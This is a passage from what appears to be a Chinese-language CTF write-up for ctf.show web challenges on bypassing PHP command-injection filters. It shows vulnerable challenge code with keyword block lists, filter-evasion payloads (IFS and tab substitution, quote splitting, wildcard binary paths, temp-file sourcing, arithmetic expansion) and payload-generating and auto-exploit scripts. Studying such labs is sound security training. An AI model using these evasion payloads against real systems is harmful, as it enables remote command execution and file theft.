class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>也可使用此python脚本能直接构造payload<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;cat f*&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br><span class="line"><span class="comment"># (&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;)</span></span><br></pre></td></tr></table></figure>使用BP传参，用Hackbar会导致二次编码没有回显也可参考羽师傅的全自动脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;C:\Kce_or.php&quot;</span>)  <span class="comment"># 没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Kce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  <span class="comment"># 填txt的文件位置</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>![非常好用](https://img1.imgtp.com/2023/07/30/byFnEvLS.png)## 42.web42### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>是将返回的结果写入黑洞目录中，得不到任何回显我们用双写绕过，用`;`分割，前一个命令正常执行，后一个命令被写入<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br><span class="line">?c=tac f*;ls</span><br></pre></td></tr></table></figure>## 43、44.web43、44### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>这题比上一题多过滤了`;`、`cat`,但思路不变我们换一种姿势`ls&&`、`tac f*&&`  &&表示前一个指令成功执行的情况下再执行后一个，也起到了分割的作用这里要注意前端会将符号进行一次url解码，需将`&&`编码后传入## 45.web45### 题目描述**命令执行，需要严格的过滤**### 解题思路这题比上一题多过滤了空格，可以考虑使用其他代替如制表符`%09`或`$IFS` 值得注意若使用$IFS代替空格键的话，只能使用通配符*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac$IFS*%26%26</span><br></pre></td></tr></table></figure>## 46、47、48、49.web46、47、48、49### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>多过滤了通配符`*`和`$`还有所有数字那以上用$IFS代替空格失效失效，但依然可以用水平制表符%09代替`*`过滤了我们还可以使用通配符？过滤了很多Linux读取命令的函数，发现没有过滤tac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%26%26</span><br><span class="line">?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></figure>## 50、51.web50、51### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>将我们常用的水平制表符`%09`和&符号`%26`过滤了&符号我们可以用|替代，但空格难以过滤，因此我们尝试过滤无须空格的命令我们使用nl命令带行号读取，但此方法不支持通配，我们使用shell特性两个单引号分割，中间的自动忽略<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php%7C%7C</span><br></pre></td></tr></table></figure>构造以上payload后查看源代码得到flag## 52.web52### 题目描述**命令执行，需要严格的过滤**### 解题思路这道题过滤了管道符`< >`，但放出了`$`<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>我们可以用复制`cp`或重命名`mv`进行尝试，空格用`${IFS}`绕过首先还是列目录看看`?c=ls||ls`,发现`flag.php`然后将`flag.php`内容拷贝到`a.txt`中，注意过滤数字，要起英文名`?c=cp${IFS}fla?.php${IFS}a.txt||ls`,访问`a.txt`得到`$flag="flag_here"`;很明显是伪造的`flag`，我们用`ls`命令查看根目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/||ls </span><br><span class="line">#bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">?c=pwd||ls  </span><br><span class="line"># /var/www/html</span><br><span class="line"></span><br><span class="line">?c=cp$&#123;IFS&#125;/fla?$&#123;IFS&#125;/var/www/html/b.txt||ls</span><br><span class="line"></span><br><span class="line">?c=ls||ls</span><br><span class="line"># a.txt b.txt flag.php index.php</span><br></pre></td></tr></table></figure>按同样方法将根目录下的flag拷贝到当前目录下最后访问b.txt即可## 53.web53### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>> php中system函数会将执行结果最后一行作为返回值返回先`?c=ls`查看文件可以用shell特性绕过过滤`c''at${IFS}fla''g.p''hp`，也可以像上一题一样使用cp命令`?c=cp${IFS}f???.php${IFS}a.txt`## 54.web54### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>可见过滤了很多，而且使用通配符过滤，以上使用单引号截断的方式也失效但经过仔细审查发现没有过滤`mv`重命名指令`?c=mv${IFS}f???????${IFS}a.txt`将flag文件重命名后访问## 55.web55### 题目描述**命令执行，需要严格的过滤**### 解题思路**非预期解**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>参考P神博客中的[无数字字母RCE](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。但因为字母不能传入，我们需要使用通配符?来进行代替`?c=/bin/base64 flag.php`替换后变成`?c=/???/????64 ????.???`**预期解**`.`（点）的用法，相当于source，可以执行sh命令在linux里面临时存放文件的目录可能会被定时删除这个目录是/tmp，然后一般网页文件会命名为php???，后面是随机的字母，即：/tmp/phpXXXXXX所以我们需要规定一个范围[@-[],从@-[就是26个字母然后关于上传文件的内容**php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了**既然要上传的文件能执行内容，所以添加内容/bin/sh因为linux系统下一切皆文件，所以一些个内置程序都是由文件组成的/bin目录下存放的都是协议shell脚本的内容，sh就是执行shell脚本，可以理解为打开终端只有打开终端我们再能输入命令然后就可以在文件里面在添加ls,cat等一系列读取文件的命令了需要构造一个post上传文件的数据包，上传的目的链接要改成题目的链接<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://27622056-3638-418a-95d0-7a217d279e6a.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>然后对该界面进行抓包，选择文件的话随便传一个就行了构造poc(漏洞执行代码)，用来执行命令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]// %20也可以用+代替</span><br><span class="line">+在这里是一个空格的作用，?是要进行匹配的字符，[@-[]表示@到[之间的字符，这里是包括有所有大写字母</span><br></pre></td></tr></table></figure>然后在bp抓包界面添加sh命令<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>![成功](https://s2.loli.net/2023/08/18/4eaCxELsyTfmv3h.png)## 57.web57### 题目描述**命令执行，需要严格的过滤，已测试，可绕**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了`、`和`?`，但是放出了`$`，可以通过构造变量的方式绕过查看源码我们只需要构造36即可shell中`$(())`代表做运算返回0，取反则为-1，因此多个相加后再取反可构造出36![成功](https://s2.loli.net/2023/08/20/rAFT5gYGi3te61b.png)payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>## 58-67.web58-67### 